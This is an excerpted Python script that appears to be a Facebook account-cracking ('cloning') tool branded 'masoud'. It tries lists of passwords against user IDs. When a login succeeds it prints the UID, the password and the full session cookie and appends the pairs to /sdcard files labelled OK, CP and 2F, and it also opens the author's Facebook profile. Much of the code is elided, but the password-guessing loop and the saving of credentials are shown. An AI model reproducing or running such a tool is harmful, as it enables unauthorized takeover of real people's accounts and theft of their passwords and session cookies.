...
oks = []
twf = []
os.system('xdg-open https://www.facebook.com/profile.php?id=100061260068252/?ref=share')
os.system('xdg-open https://www.facebook.com/profile.php?id=100061260068252/?ref=share')
...
def xyz():
    ...
    print('           \x1b[97m[\033[37;41m  masoud   \033[0;m] ')
    print(f"")
...
def Tabii():
    ...
    print(f"")
    clear()
    print(f"          \x1b[97m[\033[37;41m masoud😗   \033[0;m]")
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42mmasoud👇🔥\033[0;m]")
    print(f"")
    ...
    print(f"          \x1b[97m[\033[37;41m masoud😈  \033[0;m]")
    print(f"")
    limit = int(input(' masoud😈: 𝟏𝟎𝟎𝟎𝟎,𝟐𝟎𝟎𝟎𝟎\n\n 𝐏𝐔𝐓 𝐂𝐋𝐎𝐍𝐈𝐍𝐆 𝐋𝐈𝐌𝐈𝐓 : '))
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\033[1;32m[√]---------------------[masoud-𝑂𝐾 𖢍💚]--------------------[√]\nNUMBER : '+uid+'\nUID   : '+cid+' √ '+ps+ '\nCOOKIE   : '+coki+'\n[√]---------------------------------------------------[√]')
                cek_apk(session,coki)
                open('/sdcard/masoud-𝑂𝐾 .txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid=coki[24:39]
                Red = '\033[1;31m'
                print(f'\r{Red}[×]--------------------[ masoud-𝐂𝐏  𖢑🤧]---------------------[×]\nNUMBER : '+uid+'\nUID   : '+cid+' √ '+ps+ '\n[×]---------------------------------------------------[×]\033[1;97m')
                open('/sdcard/masoud-𝐂𝐏 .txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
                ...
                open('/sdcard/masoud-2F.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[masoud ] [%s]\33[1;97m [𝑂𝐾 :%s~𝐂𝐏 :%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
